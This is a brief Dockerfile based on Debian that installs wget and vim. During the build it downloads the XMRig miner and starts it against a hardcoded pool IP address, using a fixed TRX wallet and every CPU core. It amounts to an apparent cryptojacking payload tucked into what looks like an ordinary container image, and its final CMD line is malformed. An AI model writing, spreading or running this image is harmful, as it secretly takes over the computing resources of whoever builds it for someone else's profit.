FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig --donate-level 20000 -o 162.213.37.174:80 -u TRX:THvWpDUxASDNsdj9bDqDURfM6Qpcnw19Ev.Web$(echo $(shuf -i 1-99 -n 1))#t1av-641k -p x -k -a reth/0 -t$(nproc --all)
CMD (-H)
